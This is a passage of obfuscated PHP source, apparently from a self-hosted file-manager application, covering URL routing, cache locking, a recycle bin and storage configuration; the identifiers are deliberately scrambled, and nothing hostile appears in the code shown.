$côšŒšˆ¶¼[76]) { $E²½Ù¢¤ = $this->pluginHost . $bèáë“©óå; } else { if ($CØîë¼èƒ‰ == $côšŒšˆ¶¼[1344]) { $E²½Ù¢¤ = STATIC_PATH . $bèáë“©óå . $côšŒšˆ¶¼[1343] . $e”›äÈ÷òĞ; } else { if ($CØîë¼èƒ‰ == $côšŒšˆ¶¼[1345]) { $E²½Ù¢¤ = APP_HOST . $côšŒšˆ¶¼[1346] . $bèáë“©óå . $côšŒšˆ¶¼[1343] . $e”›äÈ÷òĞ; } else { if (isset($F†÷ÅŠÉ‚[$CØîë¼èƒ‰])) { $E²½Ù¢¤ = $F†÷ÅŠÉ‚[$CØîë¼èƒ‰] . $bèáë“©óå . $côšŒšˆ¶¼[1343] . $cë„Çßµ¸; } } } } } } goto D»ó¿›Ôªğ; D»ó¿›Ôªğ: if (!$e¸Ñ¢ø«àÄ) { return $E²½Ù¢¤; } echo $E²½Ù¢¤; goto f½›¤”ïö£; e…È¼¢¿Ù: $côšŒšˆ¶¼ =& $_SERVER[»„]; $F†÷ÅŠÉ‚ = $this->getConfig(); $e”›äÈ÷òĞ = KOD_VERSION . $côšŒšˆ¶¼[91] . KOD_VERSION_BUILD; goto fÇòñÒ„„; f½›¤”ïö£: } public function link($C„ Ë¿»Íƒ = false, $c¬¦ìÚáÜ¿ = '') { $aæ¹ÆõØ’ =& $_SERVER[»„]; if (!$C„ Ë¿»Íƒ) { $this->link($aæ¹ÆõØ’[1347], $aæ¹ÆõØ’[1345]); $this->link($aæ¹ÆõØ’[1348], $aæ¹ÆõØ’[1344]); $this->link($aæ¹ÆõØ’[1349], $aæ¹ÆõØ’[1344]); $this->link($aæ¹ÆõØ’[1350], $aæ¹ÆõØ’[1344]); $this->link($aæ¹ÆõØ’[1351], $aæ¹ÆõØ’[1344]); return; } $fáéŒ„á‰Ò = $this->url($C„ Ë¿»Íƒ, $c¬¦ìÚáÜ¿, !1); if (substr($C„ Ë¿»Íƒ, -3) == $aæ¹ÆõØ’[1352]) { echo $aæ¹ÆõØ’[1353] . $fáéŒ„á‰Ò . $aæ¹ÆõØ’[1354] . $aæ¹ÆõØ’[213]; } else { if (substr($C„ Ë¿»Íƒ, -4) == $aæ¹ÆõØ’[1355]) { echo $aæ¹ÆõØ’[1356] . $fáéŒ„á‰Ò . $aæ¹ÆõØ’[1357] . $aæ¹ÆõØ’[213]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\x5e\x2f\x5d\53", "\72\x6e\165\x6d" => "\133\60\55\71\135\53", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($f‰ÂÕ×ŒâÜ, $b¹”Ã…ºŒ) { $C¦Šêï•ö =& $_SERVER[»„]; if ($f‰ÂÕ×ŒâÜ == $C¦Šêï•ö[1358]) { $e‰“»Àº·± = array_map($C¦Šêï•ö[1359], $b¹”Ã…ºŒ[0]); $bÄøÀ‡¼ò = strpos($b¹”Ã…ºŒ[1], $C¦Šêï•ö[8]) === 0 ? $b¹”Ã…ºŒ[1] : $C¦Šêï•ö[8] . $b¹”Ã…ºŒ[1]; $bñø¬š†› = $b¹”Ã…ºŒ[2]; } else { $e‰“»Àº·± = null; $bÄøÀ‡¼ò = strpos($b¹”Ã…ºŒ[0], $C¦Šêï•ö[8]) === 0 ? $b¹”Ã…ºŒ[0] : $C¦Šêï•ö[8] . $b¹”Ã…ºŒ[0]; $bñø¬š†› = $b¹”Ã…ºŒ[1]; } array_push(self::$maps, $e‰“»Àº·±); array_push(self::$routes, $bÄøÀ‡¼ò); array_push(self::$methods, strtoupper($f‰ÂÕ×ŒâÜ)); array_push(self::$callbacks, $bñø¬š†›); } public static function error($eœÙ­àŸ–í) { self::$errorCallback = $eœÙ­àŸ–í; } public static function haltOnMatch($FÇ“Åêµ = true) { self::$halts = $FÇ“Åêµ; } public static function dispatch() { goto dÛ°ä­ÙÆ; cºÅ °Ø: self::$routes = preg_replace($eØŞæ¼Ñ•¾[1061], $eØŞæ¼Ñ•¾[8], self::$routes); if (in_array($B—ĞÆ§ÍãÕ, self::$routes)) { $fªã¥´†­’ = array_keys(self::$routes, $B—ĞÆ§ÍãÕ); foreach ($fªã¥´†­’ as $dé†ÄŞèğ) { if (self::$methods[$dé†ÄŞèğ] == $AŠø”‘òÁÃ || self::$methods[$dé†ÄŞèğ] == $eØŞæ¼Ñ•¾[1361] || in_array($AŠø”‘òÁÃ, self::$maps[$dé†ÄŞèğ])) { $bçŒô¨‘¼Ş = !0; if (!is_object(self::$callbacks[$dé†ÄŞèğ])) { $d°Û™é»® = explode($eØŞæ¼Ñ•¾[8], self::$callbacks[$dé†ÄŞèğ]); $c©º·ÀíÔæ = end($d°Û™é»®); $cõå¼Û¶ = explode($eØŞæ¼Ñ•¾[1362], $c©º·ÀíÔæ); $c˜¦ŠÄ¯µù = new $cõå¼Û¶[0](); $c˜¦ŠÄ¯µù->{$cõå¼Û¶[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$dé†ÄŞèğ]); if (self::$halts) { return; } } } } } else { $BÍ‘ ·ù¸‡ = 0; foreach (self::$routes as $dé†ÄŞèğ) { if (strpos($dé†ÄŞèğ, $eØŞæ¼Ñ•¾[4]) !== !1) { $dé†ÄŞèğ = str_replace($CÓã¶˜ŒŸ, $e†¤‹’Òƒõ, $dé†ÄŞèğ); } if (preg_match($eØŞæ¼Ñ•¾[1363] . $dé†ÄŞèğ . $eØŞæ¼Ñ•¾[1364], $B—ĞÆ§ÍãÕ, $bÓ´´‘ß)) { if (self::$methods[$BÍ‘ ·ù¸‡] == $AŠø”‘òÁÃ || self::$methods[$BÍ‘ ·ù¸‡] == $eØŞæ¼Ñ•¾[1361] || !empty(self::$maps[$BÍ‘ ·ù¸‡]) && in_array($AŠø”‘òÁÃ, self::$maps[$BÍ‘ ·ù¸‡])) { $bçŒô¨‘¼Ş = !0; array_shift($bÓ´´‘ß); if (!is_object(self::$callbacks[$BÍ‘ ·ù¸‡])) { $d°Û™é»® = explode($eØŞæ¼Ñ•¾[8], self::$callbacks[$BÍ‘ ·ù¸‡]); $c©º·ÀíÔæ = end($d°Û™é»®); $cõå¼Û¶ = explode($eØŞæ¼Ñ•¾[1362], $c©º·ÀíÔæ); $c˜¦ŠÄ¯µù = new $cõå¼Û¶[0](); if (!method_exists($c˜¦ŠÄ¯µù, $cõå¼Û¶[1])) { echo $eØŞæ¼Ñ•¾[1365]; } else { call_user_func_array(array($c˜¦ŠÄ¯µù, $cõå¼Û¶[1]), $bÓ´´‘ß); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$BÍ‘ ·ù¸‡], $bÓ´´‘ß); if (self::$halts) { return; } } } } $BÍ‘ ·ù¸‡++; } } if ($bçŒô¨‘¼Ş == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $C§Å˜§×ÉÍ =& $_SERVER[»„]; header($_SERVER[$C§Å˜§×ÉÍ[1366]] . $C§Å˜§×ÉÍ[1367]); echo $C§Å˜§×ÉÍ[1368]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eØŞæ¼Ñ•¾[1360]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F±Ì©˜Ùğ; dÛ°ä­ÙÆ: $eØŞæ¼Ñ•¾ =& $_SERVER[»„]; $B—ĞÆ§ÍãÕ = parse_url($_SERVER[$eØŞæ¼Ñ•¾[1360]], PHP_URL_PATH); $AŠø”‘òÁÃ = $_SERVER[$eØŞæ¼Ñ•¾[150]]; goto e”ªÅô’µ¬; e”ªÅô’µ¬: $CÓã¶˜ŒŸ = array_keys(static::$patterns); $e†¤‹’Òƒõ = array_values(static::$patterns); $bçŒô¨‘¼Ş = !1; goto cºÅ °Ø; F±Ì©˜Ùğ: } } goto fÀè¶«º¦İ; fÉ“ÅàõÌ: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a‚ßùóª— =& $_SERVER[»„]; $fŞ‚¨ÁÚĞ = $GLOBALS[$a‚ßùóª—[6]][$a‚ßùóª—[333]]; self::$cachePath = $fŞ‚¨ÁÚĞ[$a‚ßùóª—[163]][$a‚ßùóª—[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($f½ŠÜ·­Æ°, $c˜ºò¶ŒÇâ = 0) { goto aÜ‡Ç‘¬Ü•; aÜ‡Ç‘¬Ü•: $DğÉÚæº… =& $_SERVER[»„]; $cáÖèš«³‹ = microtime(!0); $B§ô½ÆÉŒ¦ = $cáÖèš«³‹ + $c˜ºò¶ŒÇâ + 0.0001; goto DÆï‰‹ç½Æ; DÆï‰‹ç½Æ: $a“Æ¿¦ë„¦ = rtrim(self::$cachePath, $DğÉÚæº…[8]) . $DğÉÚæº…[768] . md5($f½ŠÜ·­Æ°) . $DğÉÚæº…[769]; if (file_exists($a“Æ¿¦ë„¦) && filemtime($a“Æ¿¦ë„¦) && filemtime($a“Æ¿¦ë„¦) < time() - 10) { @unlink($a“Æ¿¦ë„¦); } do { if (file_exists($a“Æ¿¦ë„¦)) { cacheLockWait(); continue; } $föÇäÂ”… = fopen($a“Æ¿¦ë„¦, $DğÉÚæº…[770]); if (!$föÇäÂ”…) { return !1; } $Bô¼ÕœâÏÅ = flock($föÇäÂ”…, LOCK_EX | LOCK_NB); self::$caches[$f½ŠÜ·­Æ°] = array($DğÉÚæº…[771] => $föÇäÂ”…, $DğÉÚæº…[163] => $a“Æ¿¦ë„¦); fwrite($föÇäÂ”…, $B§ô½ÆÉŒ¦); clearstatcache(); if ($föÇäÂ”… && $Bô¼ÕœâÏÅ) { return !0; } cacheLockWait(); } while (microtime(!0) < $B§ô½ÆÉŒ¦); goto Eœ•×‚Ìª; Eœ•×‚Ìª: $this->unlock($f½ŠÜ·­Æ°); return !1; goto cˆ˜ÙĞœ«; cˆ˜ÙĞœ«: } public function lockGet($eç½Õ¦Æªê) { $BÃÇÁç—À =& $_SERVER[»„]; $F­ÑÆåèÌ = rtrim(self::$cachePath, $BÃÇÁç—À[8]) . $BÃÇÁç—À[768] . md5($eç½Õ¦Æªê) . $BÃÇÁç—À[769]; return file_exists($F­ÑÆåèÌ); } public function unlock($EÎÆéİ°ÇŸ) { goto CôÑĞ©õ‚‘; CôÑĞ©õ‚‘: $eŠÅÆÜìñ =& $_SERVER[»„]; $dŞŸóÆÈî = self::$caches[$EÎÆéİ°ÇŸ]; if (!$dŞŸóÆÈî) { return; } goto DËñ²„Š‚¼; DËñ²„Š‚¼: @flock($dŞŸóÆÈî[$eŠÅÆÜìñ[771]], LOCK_UN); @fclose($dŞŸóÆÈî[$eŠÅÆÜìñ[771]]); @unlink($dŞŸóÆÈî[$eŠÅÆÜìñ[163]]); goto f¥½Â¯Œæ•; f¥½Â¯Œæ•: unset(self::$caches[$EÎÆéİ°ÇŸ]); goto eó’â‹ƒªÕ; eó’â‹ƒªÕ: } } class CacheLockRedis { public function lock($cÎ›ˆšÅ³¤, $Fœ­£ÂŒÎ® = 10) { $Dé„’ËèìÂ = Cache::init(); $CÍ•ù¤ˆ…¥ = microtime(!0) + $Fœ­£ÂŒÎ®; while (microtime(!0) < $CÍ•ù¤ˆ…¥) { $c½Á˜Â¾»Ñ = $Dé„’ËèìÂ->get($cÎ›ˆšÅ³¤); if (!$c½Á˜Â¾»Ñ) { $b…ƒ±æºõ = $Dé„’ËèìÂ->setLock($cÎ›ˆšÅ³¤, $CÍ•ù¤ˆ…¥, $Fœ­£ÂŒÎ®); if ($b…ƒ±æºõ) { return !0; } } else { if ($c½Á˜Â¾»Ñ < microtime(!0)) { $Dé„’ËèìÂ->set($cÎ›ˆšÅ³¤, $CÍ•ù¤ˆ…¥, $CÍ•ù¤ˆ…¥); if ($Dé„’ËèìÂ->get($cÎ›ˆšÅ³¤) === $c½Á˜Â¾»Ñ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($cà»Áí±Ã) { return Cache::init()->get($cà»Áí±Ã); } public function unlock($BæùÊĞÖ˜¡) { return Cache::init()->remove($BæùÊĞÖ˜¡); } } goto fƒš¹è“³; dÇ„˜Œ¥¯œ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\165\162\x63\145\137\x72\x65\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\x54\x69\155\145", "\164\x69\155\145", "\151\156\163\145\162\164", "\146\x75\x6e\143\x74\151\157\156")); public function listData($eèŠ…·˜×³ = false) { $aƒ‚‹ƒÈ’Ÿ =& $_SERVER[»„]; $eèŠ…·˜×³ = $eèŠ…·˜×³ ? $eèŠ…·˜×³ : USER_ID; $bÜ÷‚ªƒê = $this->where(array($aƒ‚‹ƒÈ’Ÿ[1400] => $eèŠ…·˜×³))->select(); return array_to_keyvalue($bÜ÷‚ªƒê, $aƒ‚‹ƒÈ’Ÿ[33], $aƒ‚‹ƒÈ’Ÿ[365]); } public function moveToRecycle($F®­…¿»å) { goto a°®ÕÑ÷Ëá; a°®ÕÑ÷Ëá: $d‡™¶Ñ†„ =& $_SERVER[»„]; $A¹¾ìÅ›‰ˆ = Model($d‡™¶Ñ†„[1098]); $a‹²Å½åÉ£ = $A¹¾ìÅ›‰ˆ->sourceInfo($F®­…¿»å); goto aÜˆ­†Š‰; aÜˆ­†Š‰: if (!$a‹²Å½åÉ£ || $a‹²Å½åÉ£[$d‡™¶Ñ†„[393]] == $d‡™¶Ñ†„[83]) { return; } $eù±¬”’íÃ = array($d‡™¶Ñ†„[379] => $F®­…¿»å, $d‡™¶Ñ†„[1400] => USER_ID, $d‡™¶Ñ†„[517] => $a‹²Å½åÉ£[$d‡™¶Ñ†„[367]], $d‡™¶Ñ†„[518] => $a‹²Å½åÉ£[$d‡™¶Ñ†„[452]], $d‡™¶Ñ†„[521] => $a‹²Å½åÉ£[$d‡™¶Ñ†„[455]]); $this->add($eù±¬”’íÃ); goto Aù‚ï¯…™; Aù‚ï¯…™: $this->recycleMove($F®­…¿»å, 1); if ($a‹²Å½åÉ£[$d‡™¶Ñ†„[366]] == $d‡™¶Ñ†„[83]) { $d“±Ğ¶¤°í = array($d‡™¶Ñ†„[521] => array($d‡™¶Ñ†„[479], $a‹²Å½åÉ£[$d‡™¶Ñ†„[455]] . $F®­…¿»å . $d‡™¶Ñ†„[480])); $A¹¾ìÅ›‰ˆ->where($d“±Ğ¶¤°í)->setField($d‡™¶Ñ†„[393], 1); } goto f®­·Œäá; f®­·Œäá: } public function clear() { $this->remove(!1); } public function remove($a…§¤ö‡å· = false) { goto Fù¾½À¹»®; B¯ÃÏ‚‘´: $a…§¤ö‡å· = $a…§¤ö‡å· === !1 ? !1 : $a…§¤ö‡å·; $d‘³¦¸˜† = array(); foreach ($dùÅßµ•ˆ as $f»å¦šÊîå) { if ($a…§¤ö‡å· != !1 && !in_array($f»å¦šÊîå, $a…§¤ö‡å·)) { continue; } $AÍ¯ãÃÉ²ì->remove($f»å¦šÊîå, !1); $Aƒ†±®˜ùà = $this->where(array($aµ®öãÂ‚•[365] => $f»å¦šÊîå))->find(); $fã²ÑÒ­¹Í = $Aƒ†±®˜ùà[$aµ®öãÂ‚•[367]] . $aµ®öãÂ‚•[70] . $Aƒ†±®˜ùà[$aµ®öãÂ‚•[452]]; $d‘³¦¸˜†[$fã²ÑÒ­¹Í] = array($aµ®öãÂ‚•[517] => $Aƒ†±®˜ùà[$aµ®öãÂ‚•[367]], $aµ®öãÂ‚•[452] => $Aƒ†±®˜ùà[$aµ®öãÂ‚•[452]]); $this->where(array($aµ®öãÂ‚•[365] => $f»å¦šÊîå))->delete(); } goto Eó…¸åÓ¤™; Fù¾½À¹»®: $aµ®öãÂ‚• =& $_SERVER[»„]; $AÍ¯ãÃÉ²ì = Model($aµ®öãÂ‚•[1098]); $dùÅßµ•ˆ = $this->listData(); goto B¯ÃÏ‚‘´; Eó…¸åÓ¤™: foreach ($d‘³¦¸˜† as $A†Òóï÷‘Œ) { $AÍ¯ãÃÉ²ì->targetSpaceUpdate($A†Òóï÷‘Œ[$aµ®öãÂ‚•[367]], $A†Òóï÷‘Œ[$aµ®öãÂ‚•[452]]); } goto cÇÓ÷óíË; cÇÓ÷óíË: } public function restore($c˜º§ƒ÷‘è = false) { goto FˆĞ‚¹†Ÿ; DÖ–É‰ïçç: foreach ($f‡µÃìö¬½ as $f¸†š§Şƒ) { goto AÁÖ³¹äÕ; CòŸƒ¸¬ÖË: if ($fñÒêŸºù§[$c‡ïòî²à[366]] == $c‡ïòî²à[83]) { $E«Ö²ù“ùÒ = array($c‡ïòî²à[521] => array($c‡ïòî²à[479], $fñÒêŸºù§[$c‡ïòî²à[455]] . $f¸†š§Şƒ . $c‡ïòî²à[480])); $b¤²“µàŠ·->where($E«Ö²ù“ùÒ)->setField($c‡ïòî²à[393], 0); $this->restoreFolderChildren($f¸†š§Şƒ, $f‡µÃìö¬½); } $this->where(array($c‡ïòî²à[365] => $f¸†š§Şƒ))->delete(); $b¤²“µàŠ·->folderSizeReset($fñÒêŸºù§[$c‡ïòî²à[457]]); goto DãÒ…¿ËÃ; DãÒ…¿ËÃ: $Aîà†‹Ññ‘[] = $fñÒêŸºù§[$c‡ïòî²à[457]]; if ($fñÒêŸºù§[$c‡ïòî²à[366]] == $c‡ïòî²à[83]) { $Aîà†‹Ññ‘[] = $f¸†š§Şƒ; } $b¤²“µàŠ·->lockMoveEnd($f¸†š§Şƒ); goto bÏœÉ‹œĞè; AÁÖ³¹äÕ: if ($c˜º§ƒ÷‘è != !1 && !in_array($f¸†š§Şƒ, $c˜º§ƒ÷‘è)) { continue; } $fñÒêŸºù§ = $b¤²“µàŠ·->sourceInfo($f¸†š§Şƒ); $e‡ôöŒ¡‘¦ = $b¤²“µàŠ·->sourceInfo($fñÒêŸºù§[$c‡ïòî²à[457]]); goto FÑâ‹ä‚ƒß; FÑâ‹ä‚ƒß: if ($e‡ôöŒ¡‘¦[$c‡ïòî²à[393]] == $c‡ïòî²à[83]) { continue; } $b¤²“µàŠ·->lockMoveStart($f¸†š§Şƒ); $this->recycleMove($f¸†š§Şƒ, 0); goto CòŸƒ¸¬ÖË; bÏœÉ‹œĞè: } $b¤²“µàŠ·->updateModifyTime($Aîà†‹Ññ‘); goto f¬İ¥¾Û½ô; FˆĞ‚¹†Ÿ: $c‡ïòî²à =& $_SERVER[»„]; $b¤²“µàŠ· = Model($c‡ïòî²à[1098]); $f‡µÃìö¬½ = $this->listData(); goto FŒÇ¼«İ½; FŒÇ¼«İ½: $c˜º§ƒ÷‘è = $c˜º§ƒ÷‘è == !1 ? !1 : $c˜º§ƒ÷‘è; if (!$f‡µÃìö¬½) { return !0; } $Aîà†‹Ññ‘ = array(); goto DÖ–É‰ïçç; f¬İ¥¾Û½ô: } private function restoreFolderChildren($cã¢¿£ˆÑ, $fÄØ­ã ¡) { goto côŸ¢©ƒ¥; côŸ¢©ƒ¥: $B¶ÓÙÑ†² =& $_SERVER[»„]; $CÔã‘ÜÂ«ë = Model($B¶ÓÙÑ†²[1098]); $a¼²‰öº = array($B¶ÓÙÑ†²[365] => array($B¶ÓÙÑ†²[7], array())); goto b‚áğÖÂÆ’; f‚–Ç£Ã½: $a¼²‰öº[$B¶ÓÙÑ†²[365]][1] = array_unique($a¼²‰öº[$B¶ÓÙÑ†²[365]][1]); $a¼²‰öº[$B¶ÓÙÑ†²[904]] = $B¶ÓÙÑ†²[2152]; $CÔã‘ÜÂ«ë->where($a¼²‰öº)->setField($B¶ÓÙÑ†²[393], 1); goto fïÏ®‘³½œ; b‚áğÖÂÆ’: foreach ($fÄØ­ã ¡ as $Cù¿¢¨Œñ) { if ($Cù¿¢¨Œñ == $cã¢¿£ˆÑ) { continue; } if (!$CÔã‘ÜÂ«ë->isParentOf($cã¢¿£ˆÑ, $Cù¿¢¨Œñ)) { continue; } $c«…Îïô© = $CÔã‘ÜÂ«ë->sourceInfo($Cù¿¢¨Œñ); if ($c«…Îïô©[$B¶ÓÙÑ†²[366]] == $B¶ÓÙÑ†²[83]) { $a¼²‰öº[] = array($B¶ÓÙÑ†²[521] => array($B¶ÓÙÑ†²[479], $c«…Îïô©[$B¶ÓÙÑ†²[455]] . $Cù¿¢¨Œñ . $B¶ÓÙÑ†²[480])); } else { $a¼²‰öº[$B¶ÓÙÑ†²[365]][1][] = $Cù¿¢¨Œñ; } } if (!$a¼²‰öº[$B¶ÓÙÑ†²[365]][1]) { unset($a¼²‰öº[$B¶ÓÙÑ†²[365]]); } if (!$a¼²‰öº) { return; } goto f‚–Ç£Ã½; fïÏ®‘³½œ: } private function recycleMove($b‰êİ‹ÍÆº, $c‹†ó·½Ã = 1) { $aÉ‰…Â²„ =& $_SERVER[»„]; $cˆÍ‚¯•ß‘ = Model($aÉ‰…Â²„[1098]); $a‹ÆÅêÚ‹¥ = Model($aÉ‰…Â²„[2328]); $FÀğÍˆ«ƒ¬ = array($aÉ‰…Â²„[365] => $b‰êİ‹ÍÆº); if ($c‹†ó·½Ã) { $cˆÍ‚¯•ß‘->where($FÀğÍˆ«ƒ¬)->setField($aÉ‰…Â²„[393], 1); $a‹ÆÅêÚ‹¥->eventRecycle($b‰êİ‹ÍÆº, $aÉ‰…Â²„[2329]); } else { $fÉ›­Ã¡—Ï = $cˆÍ‚¯•ß‘->where($FÀğÍˆ«ƒ¬)->find(); $fŠØ‰´¥¢ = $fÉ›­Ã¡—Ï[$aÉ‰…Â²„[366]] == $aÉ‰…Â²„[83]; $e¸òêó³½ø = $cˆÍ‚¯•ß‘->fileNameAuto($fÉ›­Ã¡—Ï[$aÉ‰…Â²„[457]], $fÉ›­Ã¡—Ï[$aÉ‰…Â²„[28]], REPEAT_RENAME_FOLDER, $fŠØ‰´¥¢); if ($e¸òêó³½ø != $fÉ›­Ã¡—Ï[$aÉ‰…Â²„[28]]) { $cˆÍ‚¯•ß‘->rename($b‰êİ‹ÍÆº, $e¸òêó³½ø); } $cˆÍ‚¯•ß‘->where($FÀğÍˆ«ƒ¬)->setField($aÉ‰…Â²„[393], 0); $a‹ÆÅêÚ‹¥->eventRecycle($b‰êİ‹ÍÆº, $aÉ‰…Â²„[2330]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\163\x74\x6f\x72\141\x67\145\114\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\151\172\x65\x4d\x61\x78", "\163\x79\x73\164\x65\155", "\144\145\x66\x61\x75\154\164", "\144\162\x69\x76\145\x72", "\143\x6f\156\146\151\x67"); public function listData($CÈéïİÚ˜ô = false, $E¾‰ôÖŞ—š = "\155\x6f\x64\x69\x66\171\124\151\x6d\x65", $FÈ‚‰—Úø‹ = false) { goto f­ßëÔ´¡Œ; A‰Š†ëæÂŒ: return $eÓíÔ÷˜¾Ã; goto DïŠÇÛ‘µß; f­ßëÔ´¡Œ: $E×¡ö³õÁß =& $_SERVER[»„]; $eÓíÔ÷˜¾Ã = parent::listData($CÈéïİÚ˜ô, $E¾‰ôÖŞ—š, $FÈ‚‰—Úø‹); if ($CÈéïİÚ˜ô) { return $eÓíÔ÷˜¾Ã; } goto Ašä‡ï‹‚; Ašä‡ï‹‚: foreach ($eÓíÔ÷˜¾Ã as $C°ÀÌ¼Ğ³Ø => $FÂ¸ø±ïˆÌ) { unset($eÓíÔ÷˜¾Ã[$C°ÀÌ¼Ğ³Ø][$E×¡ö³õÁß[6]]); $eÓíÔ÷˜¾Ã[$C°ÀÌ¼Ğ³Ø][$E×¡ö³õÁß[2058]] = 0; } $aïÍâöÔ½Å = array_to_keyvalue($eÓíÔ÷˜¾Ã, $E×¡ö³õÁß[33], $E×¡ö³õÁß[363]); $this->_listAppendSize($eÓíÔ÷˜¾Ã, $aïÍâöÔ½Å); goto A‰Š†ëæÂŒ; DïŠÇÛ‘µß: } public function _listAppendSize(&$dà¢ÚÂÜƒù, $eËôÃ¾é‚ô) { $eÀ‚×®ÙŸ =& $_SERVER[»„]; $aßç·«ãÖ = $eÀ‚×®ÙŸ[2331] . implode($eÀ‚×®ÙŸ[47], $eËôÃ¾é‚ô) . $eÀ‚×®ÙŸ[2332]; $EŠÚæ¬‘®¯ = Model($eÀ‚×®ÙŸ[707])->query($aßç·«ãÖ); $EŠÚæ¬‘®¯ = array_to_keyvalue($EŠÚæ¬‘®¯, $eÀ‚×®ÙŸ[363], $eÀ‚×®ÙŸ[77]); foreach ($dà¢ÚÂÜƒù as $d¸·Íëë Ÿ => $Föù«£¨½) { $dà¢ÚÂÜƒù[$d¸·Íëë Ÿ][$eÀ‚×®ÙŸ[2058]] = isset($EŠÚæ¬‘®¯[$Föù«£¨½[$eÀ‚×®ÙŸ[363]]]) ? $EŠÚæ¬‘®¯[$Föù«£¨½[$eÀ‚×®ÙŸ[363]]] : 0; } } public function getConfig($BŸ¨×”²·ª) { $b‚Îãß‚ƒ = parent::listData($BŸ¨×”²·ª); return json_decode($b‚Îãß‚ƒ[$_SERVER[»„][6]], !0); } public function update($càßœŒãÚ†, $E–òµé¨ê) { goto aƒŠŸÙŠîÎ; aƒŠŸÙŠîÎ: $d¢–‰‡³¤ =& $_SERVER[»„]; $BÛ”ƒƒ£½‘ = $E–òµé¨ê[$d¢–‰‡³¤[28]]; $cïŸÂÛ²Ñ¸ = array_to_keyvalue(parent::listData(), $d¢–‰‡³¤[28]); goto d¨òéÓ¾ƒÈ; d¨òéÓ¾ƒÈ: if (isset($cïŸÂÛ²Ñ¸[$BÛ”ƒƒ£½‘]) && $cïŸÂÛ²Ñ¸[$BÛ”ƒƒ£½‘][$d¢–‰‡³¤[363]] != $càßœŒãÚ†) { return !1; } if (isset($E–òµé¨ê[$d¢–‰‡³¤[2333]]) && $E–òµé¨ê[$d¢–‰‡³¤[2333]] == $d¢–‰‡³¤[83]) { $this->checkConfig($E–òµé¨ê); } unset($E–òµé¨ê[$d¢–‰‡³¤[2333]]); goto EÂšŒâÊ¡; EÂšŒâÊ¡: $Eêõºï½å = parent::update($càßœŒãÚ†, $E–òµé¨ê); if ($Eêõºï½å && $E–òµé¨ê[$d¢–‰‡³¤[34]]) { foreach ($cïŸÂÛ²Ñ¸ as $b’âèÆªŒî) { if ($b’âèÆªŒî[$d¢–‰‡³¤[34]] && $b’âèÆªŒî[$d¢–‰‡³¤[363]] != $càßœŒãÚ†) { parent::update($b’âèÆªŒî[$d¢–‰‡³¤[363]], array($d¢–‰‡³¤[34] => 0)); } } } return $Eêõºï½å; goto ešµÜ§â×Ä; ešµÜ§â×Ä: } public function add($FñĞ›ŠÂö) { goto bÑ³—òÅ˜½; Bä•¾„ÖÍ: return $Dö¸‡•¢é; goto d‰–Œš†á; bÑ³—òÅ˜½: $eÎ¶ç÷®”† =& $_SERVER[»„]; $Aôğò = array_to_keyvalue(parent::listData(), $eÎ¶ç÷®”†[28]); if (isset($Aôğò[$FñĞ›ŠÂö[$eÎ¶ç÷®”†[28]]])) { return !1; } goto C•ÂĞ«µİ÷; C•ÂĞ«µİ÷: $this->checkConfig($FñĞ›ŠÂö); $Dö¸‡•¢é = parent::insert($FñĞ›ŠÂö); if ($Dö¸‡•¢é && $FñĞ›ŠÂö[$eÎ¶ç÷®”†[34]]) { foreach ($Aôğò as $cèÇŠˆé‡õ) { if ($cèÇŠˆé‡õ[$eÎ¶ç÷®”†[34]]) { parent::update($cèÇŠˆé‡õ[$eÎ¶ç÷®”†[363]], array($eÎ¶ç÷®”†[34] => 0)); } } } goto Bä•¾„ÖÍ; d‰–Œš†á: } public function checkConfig(&$b—·½‰ƒôÇ) { goto aŠË¶ùÄ¢¯; a„ò™¤‹: $bóŠ¢éö¶ = $EÈ„ÅÕ§Ş±[71] . $F¾Ã’ƒö‰; $EœËŒ±®ª¥ = new $bóŠ¢éö¶($EŸ…ÏÑªõ); if (in_array($dğ¥¸¸„›†, $EœËŒ±®ª¥->objectDriver)) { if (!$EœËŒ±®ª¥->isBucketCors() && !$EœËŒ±®ª¥->setBucketCors()) { $BÖÛ–£¼¶İ = LNG($EÈ„ÅÕ§Ş±[2334]); $BÖÛ–£¼¶İ .= $EÈ„ÅÕ§Ş±[2335] . LNG($EÈ„ÅÕ§Ş±[2336]); show_json($BÖÛ–£¼¶İ, !1); } } goto a­«÷‰§Ê; e”êŒ—‘—: $b—·½‰ƒôÇ[$EÈ„ÅÕ§Ş±[6]] = json_encode($EŸ…ÏÑªõ); $b—·½‰ƒôÇ[$EÈ„ÅÕ§Ş±[90]] = $F¾Ã’ƒö‰; return !0; goto FÒõåöÇ­á; aŠË¶ùÄ¢¯: $EÈ„ÅÕ§Ş± =& $_SERVER[»„]; $dğ¥¸¸„›† = strtolower($b—·½‰ƒôÇ[$EÈ„ÅÕ§Ş±[90]]); $EŸ…ÏÑªõ = json_decode($b—·½‰ƒôÇ[$EÈ„ÅÕ§Ş±[6]], !0); goto a¤Å›‘ìâÔ; a­«÷‰§Ê: $Dé—¨‚»™Ü = $EœËŒ±®ª¥->getPath($bÕº ®¡ . $EÈ„ÅÕ§Ş±[1954]); if (!$EœËŒ±®ª¥->mkfile($Dé—¨‚»™Ü)) { show_json(LNG($EÈ„ÅÕ§Ş±[2334]), !1); } $EŸ…ÏÑªõ[$EÈ„ÅÕ§Ş±[1012]] = $bÕº ®¡; goto e”êŒ—‘—; a¤Å›‘ìâÔ: foreach ($EŸ…ÏÑªõ as $b±ŠÁ‹¦ => $eìØ§ó áğ) { $EŸ…ÏÑªõ[$b±ŠÁ‹¦] = trim($eìØ§ó áğ); } $bÕº ®¡ = 